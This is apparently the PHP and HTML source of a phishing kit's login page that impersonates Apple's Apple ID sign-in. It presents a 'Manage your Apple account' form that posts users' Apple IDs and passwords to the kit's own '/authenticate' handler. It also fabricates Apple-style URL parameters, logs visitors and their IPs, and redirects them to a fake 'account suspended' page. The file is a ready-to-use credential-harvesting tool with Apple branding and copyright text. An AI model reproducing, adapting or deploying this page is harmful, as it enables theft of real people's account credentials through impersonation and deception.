<?php
require_once('function.shc.php');
$apple = new Apple;
if($_SESSION['start'] != true){
	session_destroy();
	$apple->ip();
}
if(empty($_GET['path']) && empty($_GET['appIdKey'])){
	header('Location: /?appIdKey='.md5(time()).md5(time()).'&path=/signin/?referrer=/account/manage&sslEnabled=true');
}
if($_SESSION['status_login']){
	header('Location: /account/manage/suspended/?suspended=true&appIdKey='.md5(time()).md5(time()).'&path=/account/manage?referrer=/signin/&sslEnabled=true&login=suspended');
}
$apple->logs("Sedang Login"); 
?>
<!DOCTYPE html>
<html>
<head>
	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
	<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
	<title>Sign In</title>
	<link href="<?= $apple->sitehost();?>/assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
	<link href="<?= $apple->sitehost();?>/assets/css/First.css" media="all" rel="stylesheet" type="text/css">
	<link href="<?= $apple->sitehost();?>/assets/css/Second.css" rel="stylesheet" type="text/css">
	<link href="<?= $apple->sitehost();?>/assets/css/Fonts.css" rel="prefetch stylesheet" type="text/css">
	<link href="<?= $apple->sitehost();?>/assets/css/Login.css" media="screen" rel="stylesheet" type="text/css">
</head>
<body>
	<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
	<div class="HeaderObjHolder">
	<ul class="MobHeader">
	<li class="HeaderObj MobMenIconH">
	<label class="MobMenHol"> 
		<span class="MobMenIcon MobMenIcon-top">
			<span class="MobMenIcon-crust MobMenIcon-crust-top"></span>
		</span> 
		<span class="MobMenIcon MobMenIcon-bottom">
			<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> 
		</span>
		</label>
	</li>
	<li class="HeaderObj">
		<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
		<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> 
	</li>
	</ul>
		<ul class="HeaderObjList">
			<li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
			<li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
			<li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
			<li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
			<li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
			<li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
			<li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
			<li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
			<li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
			<li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
		</ul>
	</div>
	</nav>

	<div class="subnav">
		<div class="container">
			<div class="title pull-left">Apple&nbsp;ID</div>
			<div class="menu-wrapper pull-right">
			<ul class="menu">
				<li class="item active"><a class="btn btn-link btn-signin" href="#">Sign In</a></li>
				<li class="item"><a class="btn btn-link btn-create" href="#">Create Your Apple&nbsp;ID</a></li>
				<li class="item"><a class="btn btn-link btn-faq" href="#">FAQ</a></li>
			</ul>
			</div>
		</div>
	</div>

	<div class="paws signin">
	<div class="LoginIframe" id="auth-container" style="position: relative;">
		<div class="si-body si-container container-fluid" data-theme="lite" id="content">
			<div class="widget-container fade-in restrict-max-wh fade-in" data-mode="embed">
				<div class="HoldLoginDiv">
					<div class="logo"><img style="width: 200px;" class="TextLogo" src="<?= $apple->sitehost();?>/assets/img/logo.png"></div>
					<div class="signin fade-in">
					<h3 class="LoginTitkle">Manage your Apple account</h1>
					<?php 
						if($_GET['login'] == "lfailed"){
							echo '<label><font color="red">Your Apple ID or password was incorrect.</font></label>';
						}
					?>
					<form action="<?= $apple->sitehost();?>/authenticate" name="login" id="name" method="POST">
					<div class="container HolderOfTheFields">
						<div class="row no-gutter si-field apple-id">
							<div class="col-xs-12">
								<input class="si-text-field" id="user" name="appleId" o placeholder="Apple ID" spellcheck="false" type="email">
							</div>
						</div>
						<div class="row no-gutter si-field pwd">
							<div class="col-xs-12"><label class="LoginTitle" for="pwd">Password</label> 
								<input class="si-password si-text-field" id="pass" name="accountPassword" placeholder="Password" type="password">
							</div>
						</div>
						<div class="si-remember-password">
							<input class="ax-outline" tabindex="0" type="checkbox"> 
							<label for="remember-me">Remember me</label>
						</div>
						<button class="si-button btn " id="go" tabindex="0"><i class="icon icon_sign_in"></i></button>
					</div>
					</form>
	<div class="si-container-footer">
		<a href="#">Forgot Apple&nbsp;ID or password?</a>
	</div>
	</div></div></div></div></div></div>
	<div class="flex home-content">
	<h2 id="Title" class="title separator">Your account for&nbsp;everything&nbsp;Apple.</h2>
	<div id="TitleMsg" class="intro">A single Apple&nbsp;ID and password gives you access to all Apple services.</div>
	<div id="LearnMore" class="intro"><a class="button faq-link" href="#">Learn more about Apple&nbsp;ID&nbsp;<i class="icon Righty"></i></a></div>
	<div id="AppIconsWrapper" class="apps text-center"><img class="ApplicationIcons" src="<?= $apple->sitehost();?>/assets/img/icons.jpg" height="68" width="656"></div>
	<div id="CreateAccount" class="intro create show"><a class="button create-link" href="#">Create your Apple&nbsp;ID<i class="icon Righty"></i></a></div>
	</div>
	<footer>
	<div class="container">
		<div class="footer">
			<div class="footer-wrap">
				<div class="FooterLine1">
					<div class="line-level">Shop the <a href="#">Apple Online Store</a> , visit an <a href="#">Apple Retail Store</a>, or find a <a href="#">reseller</a>.
					</div>
				</div>
				<div class="FooterLine2">
				<ul class="menu">
					<li class="item"><a href="#">Apple Info</a></li>
					<li class="item"><a href="#">Site Map</a></li>
					<li class="item"><a href="#">Hot News</a></li>
					<li class="item"><a href="#">RSS Feeds</a></li>
					<li class="item"><a href="#">Contact Us</a></li>
					<li class="item">
						<b>Indonesia</b>
					</li>
				</ul>
				</div>
				<div class="FooterLine3">Copyright © <?php echo date("Y");?> Apple Inc. All rights reserved.
				<ul class="menu">
				<li class="item"><a href="#">Terms of Use</a></li>
				<li class="item"><a href="#">Privacy Policy</a></li>
				</ul>
				</div>
			</div>
		</div>
	</div>
	</footer>
</body>
</html>